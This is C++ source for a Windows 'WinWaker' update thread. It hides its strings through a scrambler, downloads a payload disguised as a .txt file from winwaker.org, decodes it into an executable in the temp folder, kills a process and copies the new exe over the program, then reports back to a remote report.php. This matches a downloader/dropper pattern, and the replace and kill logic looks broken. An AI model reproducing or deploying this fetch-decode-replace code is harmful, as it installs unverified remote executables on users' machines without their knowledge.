#include <Windows.h>
#include <string>
#include "WinWakerThread.h"
#include "easylog.hpp"
#include "libstr.h"
#include "key.h"
#include "reg.h"
#include "file.h"
#include "http.h"
#include "codec.h"
#include "base64.h"
#include "run.h"
#include "scrambler.h"
#include "version.h"

VOID CheckVersion();
VOID Upgrade();
BOOL bVersionExpired = FALSE;

DWORD WINAPI WinWakerThreadFunction(LPVOID lpParam ) 
{ 
	// "main thread started #####\n"
	EasyLog::Format(GetStrById(255));

	// Sleep to wait network available
	int i = 0;
    while(i++ < 1)
    {
		::Sleep(1000);
		
		// "sleep: %d\n"
		EasyLog::Format(GetStrById(259), i);
	}

	// Main loop
	CheckVersion();

	// Upgrade
	if (bVersionExpired)
	{
		Upgrade();
	}

	// "thread exit\n"
	EasyLog::Format(GetStrById(260));
	return 0; 
}

VOID CheckVersion()
{
	// Check version
	int version = 0;
	do
	{
		// "WinWakerUpdate"
		std::string szHost = GetStrById(120);
		// "Version"
		std::string szTxtFilePath = userTempPath + "\\" + szHost + GetStrById(315) + "." + timeString + ".txt";

		// Download version.txt
		// "http://www.winwaker.org/data/download/winwaker.version.txt?v=0"
		std::string url = GetStrById(316);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath.c_str(), url.c_str(), url.c_str());
		if (!rc)
		{
			break;
		}

		// read version
		FILE* fp = fopen(szTxtFilePath.c_str(), "r");
		if (fp)
		{
			int i = fscanf(fp, "%d", &version);
			if (i == 1)
			{
				// "version found %d\n"
				EasyLog::Format(GetStrById(319), version);
				if (version > WINWAKER_VERSION)
				{
					bVersionExpired = TRUE;
				}
			}
			else
			{
				// "version not found %d or %d not expired\n"
				std::string format = GetStrById(317);
				EasyLog::Format(format.c_str(), i, version);
			}

			fclose(fp);
		}
		else
		{
			// "version file open fails\n"
			EasyLog::Format(GetStrById(318));
			break;
		}
	} while (false);
}

VOID Upgrade()
{
	// Download and decode and excecute
	// "WinWaker"
	std::string szExeFilePath = userTempPath + "\\" + GetStrById(120) + ".exe";
	if (!IsFileExists(szExeFilePath.c_str()))
	{
		// "WinWaker"
		std::string szTxtFilePath = userTempPath + "\\" + GetStrById(120) + "." + timeString + ".txt";

		// Download
		// "http://www.winwaker.org/data/download/winwaker.txt?v=0"
		std::string url = GetStrById(301);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath.c_str(), url.c_str(), url.c_str());
		if (rc)
		{
			// decode
			rc = Decode(szTxtFilePath.c_str(), szExeFilePath.c_str());
			// "decode %s to %s, rc %d\n"
			EasyLog::Format(GetStrById(305), szTxtFilePath.c_str(), szExeFilePath.c_str(), rc);
			DeleteFile(szTxtFilePath.c_str());
		}
	}

	// replace
	if (!IsFileExists(szExeFilePath.c_str()))
	{
		// Kill current WinWaker
		MyTerminateProcess((LPSTR)szExeFilePath.c_str());

		// Copy new exe file
		// "WinWaker"
		std::string szCurrentExeFilePath = exeFilePath + "\\" + GetStrById(120) + ".exe";
		CopyFile(szExeFilePath.c_str(), szCurrentExeFilePath.c_str(), FALSE);
	}

	if (true)
	{
		// Report
		// "WinWakerUpdate"
		std::string reportValue = GetStrById(120);
		// "http://www.winwaker.org/data/db/report.php?v=0"
		std::string url = GetStrById(121);
		HTTPReport(url.c_str(), url.c_str(), reportValue.c_str());
	}
}
